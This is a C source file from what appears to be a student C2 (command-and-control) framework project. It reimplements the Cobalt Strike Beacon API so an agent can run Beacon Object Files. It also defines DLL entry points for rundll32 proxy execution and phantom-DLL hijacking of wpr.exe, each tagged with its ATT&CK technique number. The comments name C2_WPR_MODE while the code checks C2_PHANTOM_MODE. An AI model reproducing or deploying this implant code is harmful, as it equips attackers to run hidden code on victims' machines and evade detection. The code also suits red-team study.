/*
 * ============================================================
 *  beacon_compatibility.c - Implementation de l'API Beacon
 *
 *  Fournit les fonctions Beacon que les BOFs appellent normalement
 *  via Cobalt Strike. Ici elles ecrivent dans un buffer global
 *  que le COFF loader recupere apres execution du BOF.
 *
 *  Auteur  : El Mazdougui Anass
 *  Projet  : Framework C2 Modulaire - PFE INPT 2026
 * ============================================================
 */
#include "beacon_compatibility.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

/* ============================================================
 *  BUFFER DE SORTIE GLOBAL
 *  Accumulateur thread-unsafe (l'agent est mono-thread).
 * ============================================================ */

static beacon_output_t g_output = { NULL, 0, 0 };

beacon_output_t *beacon_get_output(void) {
    return &g_output;
}

void beacon_reset_output(void) {
    if (g_output.buffer) {
        free(g_output.buffer);
        g_output.buffer = NULL;
    }
    g_output.length   = 0;
    g_output.capacity = 0;
}

/* Ajoute len bytes au buffer global - realloue si necessaire. */
static void output_append(const char *data, size_t len) {
    if (!data || len == 0) return;

    /* Capacite minimale au premier appel */
    if (g_output.capacity == 0) {
        g_output.capacity = 4096;
        g_output.buffer   = (char *)malloc(g_output.capacity);
        if (!g_output.buffer) { g_output.capacity = 0; return; }
    }

    /* Reallocation si le buffer est trop petit */
    size_t needed = g_output.length + len + 1;
    if (needed > g_output.capacity) {
        size_t new_cap = needed * 2;
        char *nb = (char *)realloc(g_output.buffer, new_cap);
        if (!nb) return;
        g_output.buffer   = nb;
        g_output.capacity = new_cap;
    }

    memcpy(g_output.buffer + g_output.length, data, len);
    g_output.length += len;
    g_output.buffer[g_output.length] = '\0';  /* null-terminate */
}


/* ============================================================
 *  FONCTIONS BEACON - SORTIE
 * ============================================================ */

void BeaconOutput(int type, const char *data, int len) {
    (void)type;  /* type ignore dans notre implementation */
    if (data && len > 0)
        output_append(data, (size_t)len);
}

void BeaconPrintf(int type, const char *fmt, ...) {
    (void)type;
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n > 0)
        output_append(tmp, (size_t)n);
}


/* ============================================================
 *  FONCTIONS BEACON - PARSING DES ARGUMENTS
 *
 *  Format wire (compatible Cobalt Strike BOF packer) :
 *    blob  : [4 bytes LE taille][donnees]
 *    int   : [4 bytes LE]
 *    short : [2 bytes LE]
 * ============================================================ */

void BeaconDataParse(datap *parser, char *buffer, int size) {
    if (!parser) return;
    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size;
    parser->size     = size;
}

char *BeaconDataExtract(datap *parser, int *size) {
    if (!parser || parser->length < 4) return NULL;

    /* Lire la taille (4 bytes little-endian) */
    int len = (int)(
        ((unsigned char)parser->buffer[0]       ) |
        ((unsigned char)parser->buffer[1] <<   8) |
        ((unsigned char)parser->buffer[2] <<  16) |
        ((unsigned char)parser->buffer[3] <<  24)
    );
    parser->buffer += 4;
    parser->length -= 4;

    if (len < 0 || len > parser->length) return NULL;

    char *data = parser->buffer;
    parser->buffer += len;
    parser->length -= len;

    if (size) *size = len;
    return data;
}

int BeaconDataInt(datap *parser) {
    if (!parser || parser->length < 4) return 0;
    int val = (int)(
        ((unsigned char)parser->buffer[0]       ) |
        ((unsigned char)parser->buffer[1] <<   8) |
        ((unsigned char)parser->buffer[2] <<  16) |
        ((unsigned char)parser->buffer[3] <<  24)
    );
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

short BeaconDataShort(datap *parser) {
    if (!parser || parser->length < 2) return 0;
    short val = (short)(
        ((unsigned char)parser->buffer[0]      ) |
        ((unsigned char)parser->buffer[1] <<  8)
    );
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

int BeaconDataLength(datap *parser) {
    return parser ? parser->length : 0;
}


/* ============================================================
 *  FONCTIONS BEACON - FORMATAGE
 * ============================================================ */

void BeaconFormatAlloc(formatp *format, int maxsz) {
    if (!format || maxsz <= 0) return;
    format->original = (char *)malloc((size_t)maxsz);
    format->buffer   = format->original;
    format->length   = 0;
    format->size     = format->original ? maxsz : 0;
}

void BeaconFormatReset(formatp *format) {
    if (!format || !format->original) return;
    format->buffer = format->original;
    format->length = 0;
}

void BeaconFormatFree(formatp *format) {
    if (!format || !format->original) return;
    free(format->original);
    format->original = NULL;
    format->buffer   = NULL;
    format->length   = 0;
    format->size     = 0;
}

void BeaconFormatAppend(formatp *format, const char *data, int len) {
    if (!format || !format->original || !data || len <= 0) return;
    if (format->length + len > format->size) return;  /* debordement */
    memcpy(format->buffer, data, (size_t)len);
    format->buffer += len;
    format->length += len;
}

void BeaconFormatPrintf(formatp *format, const char *fmt, ...) {
    if (!format || !format->original) return;
    int remaining = format->size - format->length;
    if (remaining <= 0) return;
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(format->buffer, (size_t)remaining, fmt, ap);
    va_end(ap);
    if (n > 0 && n < remaining) {
        format->buffer += n;
        format->length += n;
    }
}

char *BeaconFormatToString(formatp *format, int *size) {
    if (!format) return NULL;
    if (size) *size = format->length;
    return format->original;
}

void BeaconFormatInt(formatp *format, int value) {
    if (!format || !format->original) return;
    if (format->length + 4 > format->size) return;
    /* Serialisation little-endian */
    format->buffer[0] = (char)( value        & 0xFF);
    format->buffer[1] = (char)((value >>  8) & 0xFF);
    format->buffer[2] = (char)((value >> 16) & 0xFF);
    format->buffer[3] = (char)((value >> 24) & 0xFF);
    format->buffer += 4;
    format->length += 4;
}


/* ============================================================
 *  FONCTIONS BEACON - UTILITAIRES
 * ============================================================ */

int BeaconIsAdmin(void) {
#ifdef PLATFORM_WINDOWS
    BOOL is_admin = FALSE;
    PSID admin_group = NULL;
    SID_IDENTIFIER_AUTHORITY nt_auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt_auth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &admin_group)) {
        CheckTokenMembership(NULL, admin_group, &is_admin);
        FreeSid(admin_group);
    }
    return (int)is_admin;
#else
    return (getuid() == 0) ? 1 : 0;
#endif
}

int BeaconIsInSession(void) {
    return 1;  /* L'agent est toujours "en session" */
}

/* Stubs pour la compatibilite avec des BOFs tiers */
void *BeaconGetSpawnTo(int x86, char *buffer, int length) {
    (void)x86; (void)buffer; (void)length;
    return NULL;
}

int BeaconUseToken(void *token) {
    (void)token;
    return 0;
}

void BeaconRevertToken(void) { /* rien a faire */ }


/* ============================================================
 *  TABLE DE RESOLUTION DES SYMBOLES BEACON
 *
 *  Utilisee par le COFF loader pour resoudre les symboles
 *  Beacon sans passer par LoadLibrary/GetProcAddress.
 * ============================================================ */

typedef struct {
    const char *name;   /* Nom du symbole (sans __imp_ ni _) */
    void       *addr;   /* Adresse locale de la fonction     */
} beacon_sym_entry_t;

/* Table statique de tous les symboles Beacon disponibles */
static const beacon_sym_entry_t BEACON_SYMBOL_TABLE[] = {
    { "BeaconPrintf",         (void*)BeaconPrintf         },
    { "BeaconOutput",         (void*)BeaconOutput         },
    { "BeaconDataParse",      (void*)BeaconDataParse      },
    { "BeaconDataExtract",    (void*)BeaconDataExtract    },
    { "BeaconDataInt",        (void*)BeaconDataInt        },
    { "BeaconDataShort",      (void*)BeaconDataShort      },
    { "BeaconDataLength",     (void*)BeaconDataLength     },
    { "BeaconFormatAlloc",    (void*)BeaconFormatAlloc    },
    { "BeaconFormatReset",    (void*)BeaconFormatReset    },
    { "BeaconFormatFree",     (void*)BeaconFormatFree     },
    { "BeaconFormatAppend",   (void*)BeaconFormatAppend   },
    { "BeaconFormatPrintf",   (void*)BeaconFormatPrintf   },
    { "BeaconFormatToString", (void*)BeaconFormatToString },
    { "BeaconFormatInt",      (void*)BeaconFormatInt      },
    { "BeaconIsAdmin",        (void*)BeaconIsAdmin        },
    { "BeaconIsInSession",    (void*)BeaconIsInSession    },
    { "BeaconGetSpawnTo",     (void*)BeaconGetSpawnTo     },
    { "BeaconUseToken",       (void*)BeaconUseToken       },
    { "BeaconRevertToken",    (void*)BeaconRevertToken    },
    { NULL, NULL }
};

void *beacon_resolve_symbol(const char *name) {
    if (!name) return NULL;

    /* Normaliser le nom : retirer le prefixe __imp_ ou _ */
    const char *n = name;
    if (strncmp(n, "__imp_", 6) == 0) n += 6;
    else if (*n == '_')               n += 1;

    for (int i = 0; BEACON_SYMBOL_TABLE[i].name != NULL; i++) {
        if (strcmp(n, BEACON_SYMBOL_TABLE[i].name) == 0)
            return BEACON_SYMBOL_TABLE[i].addr;
    }
    return NULL;
}


/* ============================================================
 *  POINTS D'ENTREE DLL MODULES (-DRDLL_MODE)
 *
 *  Compiles uniquement dans les DLL modules (-DRDLL_MODE).
 *
 *  Protocole commun (env vars heritees par le processus hote) :
 *    C2_ARGS_HEX    = args packes hex-encodes (BeaconDataParse format)
 *    C2_OUTPUT_FILE = chemin fichier ou ecrire la sortie du module
 *    C2_WPR_MODE    = 1  > indique chargement par wpr.exe (T1574.002)
 *
 *  Techniques :
 *    c2_rundll32_entry()  - T1218.011 : appele explicitement par rundll32
 *    DllMain()            - T1574.002 : declenche par LoadLibrary (wpr.exe)
 * ============================================================ */
#ifdef RDLL_MODE

/* Declaration forward de go() - defini dans mod_xxx.c compile avec cette DLL */
extern void go(char *args, int args_len);

/* ?? Decode C2_ARGS_HEX et appelle go(), puis ecrit la sortie ??
 *  Logique commune a c2_rundll32_entry et DllMain (mode WPR).
 * ???????????????????????????????????????????????????????????? */
static void c2_run_module(void) {
    char hex[8192] = {0};
    DWORD hex_len  = GetEnvironmentVariableA("C2_ARGS_HEX", hex, sizeof(hex) - 1);

    unsigned char args_buf[4096] = {0};
    int           args_len       = 0;

    if (hex_len > 0 && (hex_len % 2) == 0) {
        args_len = (int)(hex_len / 2);
        if (args_len > (int)sizeof(args_buf))
            args_len = (int)sizeof(args_buf);
        for (int i = 0; i < args_len; i++) {
            char h2[3] = { hex[i * 2], hex[i * 2 + 1], '\0' };
            args_buf[i] = (unsigned char)strtoul(h2, NULL, 16);
        }
    }

    beacon_reset_output();
    go((char *)args_buf, args_len);

    char outfile[MAX_PATH] = {0};
    GetEnvironmentVariableA("C2_OUTPUT_FILE", outfile, sizeof(outfile) - 1);

    if (outfile[0]) {
        beacon_output_t *out = beacon_get_output();
        if (out && out->buffer && out->length > 0) {
            HANDLE hf = CreateFileA(
                outfile, GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
            );
            if (hf != INVALID_HANDLE_VALUE) {
                DWORD wr = 0;
                WriteFile(hf, out->buffer, (DWORD)out->length, &wr, NULL);
                CloseHandle(hf);
            }
        }
    }
}

/* ?? T1218.011 : entree rundll32.exe ????????????????????????
 *  Signature standard attendue par rundll32.exe.
 *  Exportee via -Wl,--export-all-symbols.
 * ???????????????????????????????????????????????????????????? */
void WINAPI c2_rundll32_entry(HINSTANCE hwnd, HINSTANCE hinst,
                               LPSTR lpCmdLine, int nShow) {
    (void)hwnd; (void)hinst; (void)lpCmdLine; (void)nShow;
    c2_run_module();
}

/* ?? T1574.002 : DllMain pour phantom DLL (wpr.exe, wermgr.exe?) ??
 *  Declenche sur DLL_PROCESS_ATTACH quand le binaire hote charge la DLL.
 *  N'execute le module que si C2_PHANTOM_MODE=1 est positionne
 *  pour eviter tout declenchement involontaire.
 * ???????????????????????????????????????????????????????????????? */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL; (void)lpvReserved;

    if (fdwReason == DLL_PROCESS_ATTACH) {
        char phantom[8] = {0};
        DWORD r = GetEnvironmentVariableA("C2_PHANTOM_MODE", phantom, sizeof(phantom));
        if (r > 0 && phantom[0] == '1')
            c2_run_module();
    }

    return TRUE;
}

#endif /* RDLL_MODE */
